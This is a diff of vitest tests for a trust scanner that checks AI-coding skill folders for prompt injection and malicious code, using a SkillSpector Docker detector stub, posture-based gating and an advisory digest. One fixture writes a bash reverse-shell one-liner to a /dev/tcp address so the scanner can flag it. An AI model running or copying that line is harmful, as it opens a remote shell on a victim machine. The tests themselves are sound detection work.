@@ -4,9 +4,14 @@ import { dirname, join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { executePlan } from "../../src/internals/execute.js";
 import type { PlanContext } from "../../src/internals/plan.js";
-import { fakeRunner } from "../../src/internals/proc.js";
+import { fakeRunner, type Runner } from "../../src/internals/proc.js";
 import { makeHostAdapter } from "../../src/platform/detect.js";
-import { scanTrustTree, trustScanCommand } from "../../src/trust/scan.js";
+import { skillspectorDockerRunArgv } from "../../src/trust/detectors.js";
+import {
+  scanTrustTree,
+  scanTrustTreeWithAnalyzers,
+  trustScanCommand,
+} from "../../src/trust/scan.js";
 
 let dir: string;
 
@@ -46,8 +51,8 @@ function ctx(
   options: Record<string, unknown> = {},
   env: NodeJS.ProcessEnv = {},
   posture: PlanContext["posture"] = "vibe",
+  run: Runner = fakeRunner(() => undefined),
 ): PlanContext {
-  const run = fakeRunner(() => undefined);
   return {
     root: dir,
     contextDir: "ai-coding",
@@ -460,6 +465,145 @@ describe("scanTrustTree", () => {
       ]),
     );
   });
+
+  it("skips optional SkillSpector when Docker or the detector image is unavailable", async () => {
+    skill("skills/clean", "# Clean\n");
+    const missingDocker = fakeRunner((argv) =>
+      argv[0] === "docker" ? { code: 127, stderr: "not found", spawnError: true } : undefined,
+    );
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      run: missingDocker,
+    });
+
+    expect(result.analyzersRun).toEqual(["aih-native"]);
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "skip",
+          code: "trust.detector-unavailable",
+          detail: expect.stringContaining("DEGRADED-COVERAGE"),
+        }),
+      ]),
+    );
+    expect(result.checks.map((check) => check.detail ?? "").join("\n")).toContain(
+      "Analyzers run: aih-native",
+    );
+  });
+
+  it("maps stubbed SkillSpector SARIF rule IDs into trust checks", async () => {
+    skill("skills/clean", "# Clean\n");
+    const sarif = {
+      runs: [
+        {
+          results: [
+            {
+              ruleId: "skillspector.prompt-injection",
+              message: { text: "prompt injection detected by SkillSpector" },
+              locations: [
+                {
+                  physicalLocation: {
+                    artifactLocation: { uri: "/scan/skills/clean/SKILL.md" },
+                    region: { startLine: 1 },
+                  },
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    };
+    const detector = fakeRunner((argv) => {
+      if (argv[0] !== "docker") return undefined;
+      if (argv[1] === "--version") return { code: 0, stdout: "Docker version 27\n" };
+      if (argv[1] === "image" && argv[2] === "inspect") {
+        return { code: 0, stdout: "sha256:skillspector\n" };
+      }
+      if (argv[1] === "run") return { code: 0, stdout: JSON.stringify(sarif) };
+      return undefined;
+    });
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      run: detector,
+    });
+
+    expect(result.analyzersRun).toEqual(["aih-native", "skillspector@docker"]);
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.prompt-injection",
+          detail: expect.stringContaining("SkillSpector"),
+          location: expect.objectContaining({ uri: "skills/clean/SKILL.md", startLine: 1 }),
+        }),
+      ]),
+    );
+  });
+
+  it("fails closed for enterprise required detectors and only degrades below enterprise", async () => {
+    skill("skills/clean", "# Clean\n");
+    const missingDocker = fakeRunner((argv) =>
+      argv[0] === "docker" ? { code: 127, stderr: "not found", spawnError: true } : undefined,
+    );
+
+    const vibe = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      requiredDetectors: ["skillspector"],
+      run: missingDocker,
+    });
+    expect(vibe.checks.some((check) => check.verdict === "fail")).toBe(false);
+
+    const enterprise = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "enterprise",
+      requiredDetectors: ["skillspector"],
+      run: missingDocker,
+    });
+    expect(enterprise.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.detector-unavailable",
+          detail: expect.stringContaining("required detector skillspector"),
+        }),
+      ]),
+    );
+  });
+
+  it("flags native reverse-shell script shapes as malicious code", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("scripts/pwn.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/pwn.sh", startLine: 1 }),
+          fingerprint: expect.stringMatching(/^trust-malicious-code:scripts\/pwn\.sh:1:/),
+        }),
+      ]),
+    );
+  });
+
+  it("routes the SkillSpector Docker command through cmd on Windows", () => {
+    expect(skillspectorDockerRunArgv("windows", "C:\\scan-root").slice(0, 3)).toEqual([
+      "cmd",
+      "/c",
+      "docker",
+    ]);
+  });
 });
 
 describe("trustScanCommand", () => {
@@ -480,6 +624,27 @@ describe("trustScanCommand", () => {
     expect(reasonOption?.description).toContain("workspace add");
   });
 
+  it("prints the AMBER/RED runtime advisory as a digest without auto-running mitigations", async () => {
+    skill("skills/clean", "# Clean\n");
+
+    const plan = await trustScanCommand.plan(ctx({ target: dir }));
+
+    const advisory = plan.actions.find(
+      (action) => action.kind === "digest" && action.describe === "trust runtime advisory",
+    );
+    expect(advisory).toMatchObject({
+      kind: "digest",
+      text: expect.stringContaining("No findings != safe"),
+    });
+    expect(advisory?.kind === "digest" ? advisory.text : "").toContain(
+      "npm install --ignore-scripts",
+    );
+    expect(advisory?.kind === "digest" ? advisory.text : "").toContain(
+      'permissions.deny: ["Bash(*)"]',
+    );
+    expect(plan.actions.some((action) => action.kind === "exec")).toBe(false);
+  });
+
   it("plans a read-only local scan that fails through verify checks", async () => {
     skill(
       "skills/evil",
@@ -487,7 +652,9 @@ describe("trustScanCommand", () => {
     );
 
     const plan = await trustScanCommand.plan(ctx({ target: dir }));
-    expect(plan.actions.every((action) => action.kind === "probe")).toBe(true);
+    expect(
+      plan.actions.every((action) => action.kind === "probe" || action.kind === "digest"),
+    ).toBe(true);
 
     const result = await executePlan(plan, ctx({ target: dir }));
     expect(result.applied).toBe(false);
@@ -738,6 +905,26 @@ describe("trustScanCommand", () => {
           verdict: "fail",
           code: "org-policy.drift",
           detail: expect.stringContaining("cannot be parsed"),
+        }),
+      ]),
+    );
+  });
+
+  it("threads org-policy requiredDetectors into the scan gate", async () => {
+    skill("skills/clean", "# Clean\n");
+    orgPolicy({ requiredDetectors: ["skillspector"] });
+    const missingDocker = fakeRunner((argv) =>
+      argv[0] === "docker" ? { code: 127, stderr: "not found", spawnError: true } : undefined,
+    );
+    const c = ctx({ target: dir }, {}, "enterprise", missingDocker);
+
+    const result = await executePlan(await trustScanCommand.plan(c), c);
+
+    expect(result.report?.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.detector-unavailable",
         }),
       ]),
     );
